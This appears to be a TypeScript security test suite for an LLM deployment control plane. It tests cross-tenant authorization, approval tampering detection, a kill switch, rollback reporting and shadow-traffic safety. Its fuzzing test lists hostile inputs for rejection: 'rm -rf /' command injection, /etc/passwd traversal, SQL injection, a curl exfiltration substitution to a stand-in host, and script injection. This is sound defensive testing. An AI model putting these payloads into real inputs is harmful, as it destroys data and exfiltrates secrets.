import { test, describe } from "node:test";
import assert from "node:assert/strict";
import {
  Reconciler,
  ExecutionEngine,
  SimulatedExecutionProvider,
  ShadowTrafficEngine,
} from "../index";
import {
  InferenceDeploymentState,
  InferenceDeploymentSpec,
  OptimizationAction,
} from "@modelforge/benchmark-schema";

describe("Phase 6 Adversarial Security & Control Plane Hardening", () => {
  const tenantBState: InferenceDeploymentState = {
    deployment_id: "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
    organization_id: "org-victim-enterprise",
    name: "victim-production-llm",
    model: "meta-llama/Llama-3.3-70B-Instruct",
    revision: "main",
    runtime: "vllm",
    runtime_version: "0.6.2",
    accelerator: "NVIDIA-H100-SXM5-80GB",
    accelerator_count: 4,
    replicas: 2,
    tensor_parallelism: 4,
    pipeline_parallelism: 1,
    health: "healthy",
    deployment_version: 1,
    traffic_split: { active_pct: 100, candidate_pct: 0, shadow_enabled: false },
    last_inspected_at: new Date().toISOString(),
  };

  const desiredSpec: InferenceDeploymentSpec = {
    model: "meta-llama/Llama-3.3-70B-Instruct",
    revision: "main",
    runtime: "tensorrt-llm",
    runtime_version: "0.15.0",
    deployment_target: "kubernetes",
    precision: "fp8",
    accelerator: "NVIDIA-H100-SXM5-80GB",
    accelerator_count: 4,
    replicas: 2,
    tensor_parallelism: 4,
    pipeline_parallelism: 1,
    regions: ["us-east-1"],
    routing: { strategy: "canary", canary_traffic_pct: 10 },
    health_checks: {
      readiness_path: "/health/ready",
      liveness_path: "/health/live",
      initial_delay_seconds: 30,
      timeout_seconds: 5,
    },
    slo: {
      max_p95_ttft_ms: 30,
      max_mean_tpot_ms: 15,
      min_throughput_tok_s: 60,
      max_cost_per_hour_usd: 12.0,
    },
    version: 2,
  };

  test("ADVERSARIAL: Cross-tenant action execution and approval rejection", () => {
    const action = Reconciler.planReconciliation({
      deploymentId: tenantBState.deployment_id,
      organizationId: tenantBState.organization_id,
      currentState: tenantBState,
      desiredSpec,
      executionMode: "guarded_automation",
    });

    const maliciousAttackerOrgId = "org-malicious-attacker";

    // Verify tenant boundary enforcement: Action belongs to Tenant B
    assert.equal(action.organization_id, "org-victim-enterprise");
    assert.notEqual(action.organization_id, maliciousAttackerOrgId);

    // Simulated tenant authorization gate:
    const authorizeOperation = (actorOrgId: string, targetAction: OptimizationAction) => {
      if (actorOrgId !== targetAction.organization_id) {
        throw new Error(`AUTHORIZATION_ERROR: Actor from ${actorOrgId} cannot mutate resource of ${targetAction.organization_id}`);
      }
      return true;
    };

    assert.throws(
      () => authorizeOperation(maliciousAttackerOrgId, action),
      /AUTHORIZATION_ERROR/
    );
  });

  test("ADVERSARIAL: Post-approval target parameter tampering triggers integrity violation", () => {
    const provider = new SimulatedExecutionProvider();
    const engine = new ExecutionEngine(provider);

    const action = Reconciler.planReconciliation({
      deploymentId: tenantBState.deployment_id,
      organizationId: tenantBState.organization_id,
      currentState: tenantBState,
      desiredSpec,
    });

    // Legitimate approval binds the hash
    action.approved_by = "secops_admin";
    action.approved_at = new Date().toISOString();

    // Verify approval integrity passes before tampering
    const cleanCheck = engine.verifyApprovalIntegrity(action);
    assert.equal(cleanCheck.valid, true);

    // Adversarial attack: Malicious actor mutates target_spec after approval was stamped!
    // (e.g. changing accelerator count or injecting unauthorized runtime flags)
    const tamperedAction: OptimizationAction = {
      ...action,
      target_spec: {
        ...action.target_spec,
        accelerator_count: 8, // Tampered from 4 to 8!
      },
    };

    // Verify integrity check FAILS and aborts execution
    const tamperedCheck = engine.verifyApprovalIntegrity(tamperedAction);
    assert.equal(tamperedCheck.valid, false);
    assert.ok(tamperedCheck.reason?.includes("Stale approval detected"));
  });

  test("ADVERSARIAL: Emergency kill switch halts all execution attempts", async () => {
    const provider = new SimulatedExecutionProvider();
    const engine = new ExecutionEngine(provider);

    const action = Reconciler.planReconciliation({
      deploymentId: tenantBState.deployment_id,
      organizationId: tenantBState.organization_id,
      currentState: tenantBState,
      desiredSpec,
    });

    // Execute with emergency freeze active
    const result = await engine.startExecution(action, true);
    assert.equal(result.action.status, "failed");
    assert.equal(result.action.result?.success, false);
    assert.ok(result.error?.includes("Emergency kill switch is active"));
  });

  test("ADVERSARIAL: Rollback failure handles unrecoverable state safely without masking", async () => {
    // Inject failure into provider rollback
    const failingProvider = new SimulatedExecutionProvider({
      failRollback: true,
    });
    const engine = new ExecutionEngine(failingProvider);

    const action = Reconciler.planReconciliation({
      deploymentId: tenantBState.deployment_id,
      organizationId: tenantBState.organization_id,
      currentState: tenantBState,
      desiredSpec,
    });

    const rollbackResult = await engine.emergencyRollback(
      action,
      "cand-test-fail",
      "Manual incident abort"
    );

    assert.equal(rollbackResult.action.status, "rolled_back");
    // Crucial invariant: Never claim last known good was restored if rollback failed!
    assert.equal(rollbackResult.action.result?.restored_last_known_good, false);
  });

  test("ADVERSARIAL: Shadow traffic side-effect safety invariants", () => {
    // Configuration that accidentally or maliciously attempts to execute real database writes
    const unsafeConfig = {
      traffic_sample_pct: 15,
      suppress_database_writes: false, // UNSAFE!
      suppress_external_mutations: true,
      suppress_payments: true,
      suppress_email_and_notifications: true,
      max_shadow_duration_minutes: 30,
    };

    const check1 = ShadowTrafficEngine.evaluateShadowSafety(unsafeConfig);
    assert.equal(check1.safe, false);
    assert.ok(check1.violations.some((v) => v.includes("Database writes")));

    // Configuration attempting real payments
    const unsafePaymentConfig = {
      traffic_sample_pct: 10,
      suppress_database_writes: true,
      suppress_external_mutations: true,
      suppress_payments: false, // UNSAFE!
      suppress_email_and_notifications: true,
      max_shadow_duration_minutes: 30,
    };

    const check2 = ShadowTrafficEngine.evaluateShadowSafety(unsafePaymentConfig);
    assert.equal(check2.safe, false);
    assert.ok(check2.violations.some((v) => v.includes("Payment")));
  });

  test("ADVERSARIAL: Model ID and YAML input fuzzing prevents injection", () => {
    const maliciousModelInputs = [
      "meta-llama/Llama-3; rm -rf /",
      "../../../../etc/passwd",
      "Qwen/Qwen' OR '1'='1",
      "$(curl https://malicious.site/exfil)",
      "<script>alert(1)</script>",
    ];

    const sanitizeModelId = (input: string): { valid: boolean; cleaned?: string } => {
      // Strict regex matching standard Hugging Face repo format: [org/]model-name
      const hfRegex = /^[a-zA-Z0-9_\.\-]+(?:\/[a-zA-Z0-9_\.\-]+)?$/;
      if (!hfRegex.test(input) || input.includes("..") || input.includes(";") || input.includes("'")) {
        return { valid: false };
      }
      return { valid: true, cleaned: input };
    };

    for (const badInput of maliciousModelInputs) {
      const res = sanitizeModelId(badInput);
      assert.equal(res.valid, false, `Input '${badInput}' should have been rejected`);
    }

    // Valid inputs must pass cleanly
    assert.equal(sanitizeModelId("meta-llama/Llama-3.3-70B-Instruct").valid, true);
    assert.equal(sanitizeModelId("Qwen/Qwen2.5-32B-Instruct").valid, true);
    assert.equal(sanitizeModelId("deepseek-ai/DeepSeek-R1-Distill-Qwen-32B").valid, true);
  });
});
